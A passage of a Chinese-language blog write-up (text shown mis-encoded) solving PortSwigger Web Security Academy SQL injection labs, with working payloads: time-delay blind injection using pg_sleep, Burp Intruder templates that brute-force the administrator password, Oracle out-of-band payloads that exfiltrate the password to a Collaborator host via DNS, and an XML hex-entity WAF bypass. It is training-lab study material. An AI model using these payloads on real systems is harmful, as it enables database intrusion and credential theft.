<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select cast(password as int) from users where username=&#x27;administrator&#x27;--</span><br></pre></td></tr></table></figure>

<p>ä½†å®é™…ä¸Šä¼šæç¤ºï¼ˆSQL è¯­å¥å·²ç»æˆªæ–­ï¼‰ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = &#x27;&#x27; union select cast(password as int) from users where userna&#x27;. Expected  char</span><br></pre></td></tr></table></figure>

<p>å®˜æ–¹è§£æ³•ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; AND cast((select password from users limit 1) as int)=1--</span><br></pre></td></tr></table></figure>

<h3 id="2-4-Lab-Blind-SQL-injection-with-time-delays"><a href="#2-4-Lab-Blind-SQL-injection-with-time-delays" class="headerlink" title="2.4 Lab: Blind SQL injection with time delays"></a>2.4 Lab: Blind SQL injection with time delays</h3><blockquote>
<p>This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.</p>
<p>The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.</p>
<p>To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay.</p>
</blockquote>
<p>æ²¡æœ‰ä»»ä½•é”™è¯¯æç¤ºï¼Œåªèƒ½æ…¢æ…¢æµ‹è¯•ï¼Œé€šè¿‡ <code>sleep</code> æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨ SQL æ³¨å…¥æ¼æ´ã€‚</p>
<p>å®é™…ä¸Šè¿™æ˜¯ä¸€ä¸ª PostgreSQL æ•°æ®åº“ï¼Œä½¿ç”¨ <code>pg_sleep(10)</code> å¯ä»¥å®ç°å»¶æ—¶ï¼Œå…³é”®æ˜¯æ€ä¹ˆå’Œ <code>select</code> è¿›è¡Œæ‹¼æ¥ã€‚ç”±äº <code>pg_sleep</code> è¿”å› <code>void</code>ï¼Œæ‰€ä»¥ï¼š</p>
<ul>
<li>æ— æ³•é€šè¿‡ <code>union</code> æ¥æ‹¼æ¥ï¼ˆè¦æ±‚åˆ—æ•°ã€ç±»å‹ä¸€è‡´ï¼‰</li>
<li>æ— æ³•é€šè¿‡ <code>AND</code> ç­‰æ‹¼æ¥ï¼ˆè¦æ±‚ <code>BOOL</code>ï¼‰</li>
<li>å› ä¸ºåœ¨ Cookie ä¸­ï¼Œæ‰€ä»¥ä¹Ÿæ— æ³•ä½¿ç”¨ <code>;</code></li>
</ul>
<p>å¯è¡Œçš„æ–¹æ³•å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: TrackingId=X&#x27; || pg_sleep(10)--; session=yMtu8nt3WDEDhimQZN3Cq6hbBTmZMmKe</span><br></pre></td></tr></table></figure>

<p>åœ¨ PostgreSQL ä¸­ï¼Œ<code>||</code> ç”¨äºæ‹¼æ¥å­—ç¬¦ä¸²ï¼Œè€Œ <code>void</code> å¯ä»¥å’Œå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œå°½ç®¡ä¸äº§ç”Ÿä»»ä½•ä½œç”¨ã€‚</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;a&#x27;</span><span class="operator">||</span>pg_sleep(<span class="number">1</span>)<span class="operator">||</span><span class="string">&#x27;b&#x27;</span> <span class="comment">-- ab</span></span><br></pre></td></tr></table></figure>

<p>æ­¤å¤–ï¼Œå¦‚ä¸‹æ–¹æ³•ä¹Ÿå¯ä»¥ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: TrackingId=X&#x27; OR pg_sleep(10) is null--; session=yMtu8nt3WDEDhimQZN3Cq6hbBTmZMmKe</span><br></pre></td></tr></table></figure>

<h3 id="2-5-Lab-Blind-SQL-injection-with-time-delays-and-information-retrieval"><a href="#2-5-Lab-Blind-SQL-injection-with-time-delays-and-information-retrieval" class="headerlink" title="2.5 Lab: Blind SQL injection with time delays and information retrieval"></a>2.5 Lab: Blind SQL injection with time delays and information retrieval</h3><blockquote>
<p>This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.</p>
<p>The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.</p>
<p>The database contains a different table called <code>users</code>, with columns called <code>username</code> and <code>password</code>. You need to exploit the blind SQL injection vulnerability to find out the password of the <code>administrator</code> user.</p>
<p>To solve the lab, log in as the <code>administrator</code> user.</p>
</blockquote>
<p>é¦–å…ˆï¼Œé€šè¿‡å¦‚ä¸‹è¯­å¥ï¼Œå¯ä»¥ç¡®è®¤æ•°æ®åº“ç±»å‹ä¸º PostgreSQLï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId=mFKKwlWqebWsnHxd&#x27;||pg_sleep(10)--;</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥ï¼Œéœ€è¦ä¸€æ­¥ä¸€æ­¥æµ‹è¯•å‡ºçˆ†ç ´çš„æ¨¡æ¿ï¼š</p>
<p>1ï¼‰é¦–å…ˆï¼Œæˆ‘ä»¬çš„ç›®æ ‡æ˜¯éœ€è¦å…ˆæµ‹è¯• <code>password</code> å­—æ®µçš„é•¿åº¦ï¼Œçœ‹èµ·æ¥åº”è¯¥è¿™ä¹ˆå†™ SQLï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">X&#x27; union</span><br><span class="line">select</span><br><span class="line">  case when (length(password)=20) then pg_sleep(10) else pg_sleep(0) end</span><br><span class="line">from</span><br><span class="line">  users</span><br><span class="line">where username=&#x27;administrator&#x27;--</span><br></pre></td></tr></table></figure>

<p>2ï¼‰æˆ‘ä»¬å¯ä»¥å…ˆä½¿ç”¨ <code>username</code> æ¥æµ‹è¯•ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">X&#x27; union</span><br><span class="line">select</span><br><span class="line">  case when (length(username)=13) then pg_sleep(10) else pg_sleep(0) end</span><br><span class="line">from</span><br><span class="line">  users</span><br><span class="line">where username=&#x27;administrator&#x27;--</span><br></pre></td></tr></table></figure>

<p>3ï¼‰è¿™é‡Œä¼šå‡ºé”™ï¼Œå› ä¸ºä¸ç®¡æ˜¯ä»€ä¹ˆæ¡ä»¶ï¼Œè¿™é‡Œ <code>select</code>  éƒ½è¿”å› <code>void</code>ï¼Œæ˜¯æ²¡åŠæ³•æ»¡è¶³ <code>union</code> çš„</p>
<p>4ï¼‰è€ƒè™‘åˆ°ä¸Šä¸€é¢˜çš„è§£æ³•ï¼Œè¿™é‡Œä½¿ç”¨ <code>||</code> æ¥æ‹¼æ¥å­—ç¬¦ä¸²ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">X&#x27; union</span><br><span class="line">select</span><br><span class="line">  case when (length(username)=13) then pg_sleep(10)||&#x27;a&#x27; else pg_sleep(0)||&#x27;b&#x27; end</span><br><span class="line">from</span><br><span class="line">  users</span><br><span class="line">where username=&#x27;administrator&#x27;--</span><br></pre></td></tr></table></figure>

<p>5ï¼‰è¿™é‡Œè¿˜åªæœ‰ <code>1</code> åˆ—æ•°æ®ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆæµ‹è¯•æ˜¯å¦å­˜åœ¨æ—¶å»¶ï¼Œå¦‚æœæ˜¯åˆ™è¯´æ˜å°±åªæœ‰ä¸€åˆ—æ•°æ®ï¼Œå¦åˆ™è¿˜éœ€è¦æµ‹è¯•å‡ºæ•°æ®åˆ—æ•°</p>
<p>6ï¼‰å®é™…æµ‹è¯•è¡¨æ˜ï¼Œç¡®å®åªæœ‰ä¸€åˆ—æ•°æ®</p>
<p>ç°åœ¨ï¼Œçˆ†ç ´æ¨¡æ¿ç¡®è®¤äº†ï¼Œå°±å¯ä»¥æµ‹è¯•å‡ºå¯†ç å­—æ®µçš„é•¿åº¦äº†ï¼Œæ¨¡æ¿å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">X&#x27; union</span><br><span class="line">select</span><br><span class="line">  case when (length(password)=Â§1Â§) then pg_sleep(10)||&#x27;a&#x27; else pg_sleep(0)||&#x27;b&#x27; end</span><br><span class="line">from</span><br><span class="line">  users</span><br><span class="line">where username=&#x27;administrator&#x27;--</span><br></pre></td></tr></table></figure>

<p>åœ¨ <a href="https://secdroid.github.io/tags/Burp-Intruder/">Burp Intruder</a> ä¸­ï¼Œç¡®è®¤æ—¶å»¶çš„æ–¹æ³•åœ¨ <a href="https://secdroid.github.io/2025/01/13/burp-web-academy-authentication/">Burp Web Academy é‰´æƒæ¼æ´</a> æœ‰è®²ï¼Œå¯ä»¥å‚è€ƒä¹‹ã€‚å®é™…æµ‹è¯•ç»“æœè¡¨æ˜ï¼Œå¯†ç å­—æ®µçš„é•¿åº¦è¿˜æ˜¯ <code>20</code>ã€‚æ¥ä¸‹æ¥ï¼Œå°±éœ€è¦æŒ¨ä¸ªçˆ†ç ´å¯†ç å­—ç¬¦äº†ï¼Œé¢˜ç›®æœ¬èº«æ²¡ç»™æç¤ºï¼Œä½†æˆ‘æƒ³å¯†ç å­—ç¬¦åº”è¯¥è¿˜æ˜¯ <code>0123456789abcdefghijklmnopqrstuvwxyz</code>ã€‚</p>
<p>ä½¿ç”¨ Cluster Bomb æ¨¡å¼æ”»å‡»ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X&#x27; union select case when (substring(password,Â§1Â§,1)=&#x27;Â§0Â§&#x27;) then pg_sleep(20)||&#x27;a&#x27; else pg_sleep(0)||&#x27;b&#x27; end from users where username=&#x27;administrator&#x27;--</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼Œè¿™é‡Œç›²æ³¨çš„æ—¶å»¶è¦è®¾å¤§ä¸€ç‚¹ï¼Œå¦åˆ™å¾ˆå¯èƒ½éš¾ä»¥å’Œæ­£å¸¸çš„è¯·æ±‚åŒºåˆ†å¼€æ¥ï¼ˆå¦‚æœç½‘ç»œæœ¬èº«ä¸æ˜¯å¾ˆå¥½çš„è¯ï¼‰ï¼›æœ€ç»ˆçš„å¯†ç ä¸º <code>mw478rp4wz48m035ssf9</code>ã€‚</p>
<h3 id="2-6-Lab-Blind-SQL-injection-with-out-of-band-interaction"><a href="#2-6-Lab-Blind-SQL-injection-with-out-of-band-interaction" class="headerlink" title="2.6 Lab: Blind SQL injection with out-of-band interaction"></a>2.6 Lab: Blind SQL injection with out-of-band interaction</h3><blockquote>
<p>This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.</p>
<p>The SQL query is executed asynchronously and has no effect on the applicationâ€™s response. However, you can trigger out-of-band interactions with an external domain.</p>
<p>To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.</p>
</blockquote>
<p>å‚è€ƒäº†ç­”æ¡ˆï¼ˆæ˜¯ Oracle æ•°æ®åº“ï¼‰ï¼ŒPayload ä» <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a> å¤åˆ¶ï¼Œæ›¿æ¢ <a href="https://secdroid.github.io/tags/Burp-Collaborator/">Burp Collaborator</a> åŸŸåï¼Œç„¶åå¯¹ <code>%;</code> è¿›è¡Œ URL ç¼–ç å³å¯ã€‚</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0ac1009003df5d54805cb37500da0049.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>TrackingId=&#x27; union SELECT EXTRACTVALUE(xmltype(&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY %25 remote SYSTEM &quot;http://f9pxrqzetanfzr6kfshia78kwb22qtei.oastify.com&quot;&gt; %25remote%3b]&gt;&#x27;),&#x27;/l&#x27;) FROM dual--; session=p0mhOZJU9yvs3bv2YKv9QSjTelwFasGO</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br></pre></td></tr></table></figure>

<h3 id="2-7-Lab-Blind-SQL-injection-with-out-of-band-data-exfiltration"><a href="#2-7-Lab-Blind-SQL-injection-with-out-of-band-data-exfiltration" class="headerlink" title="2.7 Lab: Blind SQL injection with out-of-band data exfiltration"></a>2.7 Lab: Blind SQL injection with out-of-band data exfiltration</h3><blockquote>
<p>This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.</p>
<p>The SQL query is executed asynchronously and has no effect on the applicationâ€™s response. However, you can trigger out-of-band interactions with an external domain.</p>
<p>The database contains a different table called <code>users</code>, with columns called <code>username</code> and <code>password</code>. You need to exploit the blind SQL injection vulnerability to find out the password of the <code>administrator</code> user.</p>
<p>To solve the lab, log in as the <code>administrator</code> user.</p>
</blockquote>
<p>ç›´æ¥å¥—ç”¨ Cheat Sheet çš„ Oracle Payloadï¼š</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0afc009d0396880a82f117540021000b.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>TrackingId=&#x27; union SELECT EXTRACTVALUE(xmltype(&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY %25 remote SYSTEM &quot;http://&#x27;||(select password from users where username=&#x27;administrator&#x27;)||&#x27;.f9pxrqzetanfzr6kfshia78kwb22qtei.oastify.com&quot;&gt; %25remote%3b]&gt;&#x27;),&#x27;/l&#x27;) FROM dual--; session=z6RTZ5PsrOakJCiknhTe0NsoOPH4MXaS</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br></pre></td></tr></table></figure>

<h3 id="2-8-Lab-SQL-injection-with-filter-bypass-via-XML-encoding"><a href="#2-8-Lab-SQL-injection-with-filter-bypass-via-XML-encoding" class="headerlink" title="2.8 Lab: SQL injection with filter bypass via XML encoding"></a>2.8 Lab: SQL injection with filter bypass via XML encoding</h3><blockquote>
<p>This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the applicationâ€™s response, so you can use a UNION attack to retrieve data from other tables.</p>
<p>The database contains a <code>users</code> table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin userâ€™s credentials, then log in to their account.</p>
</blockquote>
<p>å‘é€å¸¦æœ‰ç‰¹æ®Šå­—ç¬¦ä¸²çš„ Payloadï¼š</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/product/stock</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a89005704e3d43981af947300e800c3.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=MZOrHlbwdfeEozaSDZpAt3hzCJr7PNJD</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>116</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/xml</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">stockCheck</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">productId</span>&gt;</span>1&#x27;<span class="tag">&lt;/<span class="name">productId</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">storeId</span>&gt;</span>2<span class="tag">&lt;/<span class="name">storeId</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">stockCheck</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>ä¼šæç¤ºæ£€æµ‹åˆ°æ”»å‡»è¡Œä¸ºï¼š</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/2</span> <span class="number">403</span> Forbidden</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=utf-8</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>17</span><br><span class="line"></span><br><span class="line"><span class="language-1c"><span class="string">&quot;Attack detected&quot;</span></span></span><br></pre></td></tr></table></figure>

<p>å‚è€ƒå®˜æ–¹ç­”æ¡ˆï¼š</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">storeId</span>&gt;</span>&lt;@hex_entities&gt;1 UNION SELECT username || &#x27;~&#x27; || password FROM users&lt;/@hex_entities&gt;<span class="tag">&lt;/<span class="name">storeId</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œç”¨åˆ°äº†ä¸€ä¸ªåä¸º <code>Hackvertor</code> çš„ Burp æ’ä»¶ï¼Œä½¿ç”¨äº†ä»–æä¾›çš„ <code>hex_entities</code> ç¼–ç åŠŸèƒ½ã€‚æŸ¥äº†ä¸€ä¸‹ï¼ŒXML æ”¯æŒä½¿ç”¨ 16 è¿›åˆ¶æ¥ç¼–ç  Unicode å­—ç¬¦ï¼š</p>
<blockquote>
<p>Hexadecimal entities in XML are a way to represent characters using their Unicode code points. They are written in the format <code>&amp;#xHHHH;</code>, where <code>HHHH</code> is the hexadecimal code of the character. This is useful for encoding special characters, symbols, or non-ASCII characters within an XML document.</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span>&gt;</span>This is a smiley face: <span class="symbol">&amp;#x1F600;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span> <span class="comment">&lt;!-- ğŸ˜€ --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span>&gt;</span>This is a heart: <span class="symbol">&amp;#x2764;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span> <span class="comment">&lt;!-- â¤ --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span>&gt;</span>This is a check mark: <span class="symbol">&amp;#x2713;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span> <span class="comment">&lt;!-- âœ“ --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>çŸ¥é“äº†åŸç†ï¼Œæˆ‘ä»¬å°±å¯ä»¥è‡ªå·±å®ç°ï¼Œè€Œä¸ç”¨å€ŸåŠ©äºæ’ä»¶äº†ã€‚è€Œä¸”æµ‹è¯•ä¸‹æ¥å‘ç°ï¼ŒWAF åªæ£€æµ‹äº† <code>union/select/&#39;</code>ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥ç®€å•ç‚¹ï¼š</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">stockCheck</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">productId</span>&gt;</span>1<span class="tag">&lt;/<span class="name">productId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">storeId</span>&gt;</span>1 <span class="symbol">&amp;#x0055;</span>NION <span class="symbol">&amp;#x0053;</span>ELECT username || <span class="symbol">&amp;#x0027;</span>~<span class="symbol">&amp;#x0027;</span> || password FROM users<span class="tag">&lt;/<span class="name">storeId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">stockCheck</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>HTTP Response ç›´æ¥è¿”å›äº†æŸ¥è¯¢ç»“æœï¼š</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/2</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/plain; charset=utf-8</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>100</span><br><span class="line"></span><br><span class="line"><span class="language-maxima">wiener~qdfzjzdq698vwhelo3xb</span></span><br><span class="line"><span class="language-maxima">administrator~e2woyn4r8l19954m2vis</span></span><br><span class="line"><span class="language-maxima">carlos~fa41qa981t9av3jvlsqs</span></span><br><span class="line"><span class="language-maxima"><span class="number">838</span> <span class="built_in">units</span></span></span><br></pre></td></tr></table></figure>

<h2 id="0x03-å°ç»“"><a href="#0x03-å°ç»“" class="headerlink" title="0x03. å°ç»“"></a>0x03. å°ç»“</h2><ul>
<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a></li>
<li>ç›²æ³¨åœºæ™¯ä¸‹çš„æ•°æ®åº“è¡¨å­—æ®µçš„å€¼çˆ†ç ´<ul>
<li>length</li>
<li>substring<ul>
<li>Oracle ä½¿ç”¨ <code>substr</code></li>
</ul>
</li>
</ul>
</li>
<li>åŸºäºå»¶æ—¶çš„ç›²æ³¨<ul>
<li>åˆç†è®¾ç½®ç›²æ³¨æ—¶å»¶ï¼Œé˜²æ­¢ç½‘ç»œæœ¬èº«çš„å»¶è¿Ÿæˆ–è€…ä¸ç¨³å®šäº§ç”Ÿå¹²æ‰°</li>
</ul>
</li>
<li>XML 16 è¿›åˆ¶ç¼–ç <ul>
<li><code>&amp;#xHHHH;</code></li>
</ul>
</li>
<li>å……åˆ†åˆ©ç”¨æœåŠ¡å™¨è¿”å›çš„é”™è¯¯ä¿¡æ¯æ¥æ¨æ–­åå°çš„è¿è¡Œé€»è¾‘</li>
</ul>
<h2 id="0x04-å‚è€ƒæ–‡æ¡£"><a href="#0x04-å‚è€ƒæ–‡æ¡£" class="headerlink" title="0x04. å‚è€ƒæ–‡æ¡£"></a>0x04. å‚è€ƒæ–‡æ¡£</h2><ol>
<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/all-labs#sql-injection">https://portswigger.net/web-security/all-labs#sql-injection</a></li>
<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/cheat-sheet">https://portswigger.net/web-security/sql-injection/cheat-sheet</a></li>
</ol>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/SQL-Injection/" rel="tag"># SQL Injection</a>
              <a href="/tags/Burp-Intruder/" rel="tag"># Burp Intruder</a>
              <a href="/tags/Burp-Collaborator/" rel="tag"># Burp Collaborator</a>
              <a href="/tags/Blind-Injection/" rel="tag"># Blind Injection</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2025/03/05/burp-web-academy-sql-injection/" rel="prev" title="Burp Web Academy SQL æ³¨å…¥">
                  <i class="fa fa-angle-left"></i> Burp Web Academy SQL æ³¨å…¥
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2025/03/10/burp-web-academy-business-logic-vulnerabilities/" rel="next" title="Burp Web Academy Business Logic Vulnerabilities">
                  Burp Web Academy Business Logic Vulnerabilities <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">Livermore</span>
  </div>
  <div class="powered-by">ç”± <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> å¼ºåŠ›é©±åŠ¨
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="è¿”å›é¡¶éƒ¨">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>

  






  





</body>
</html>
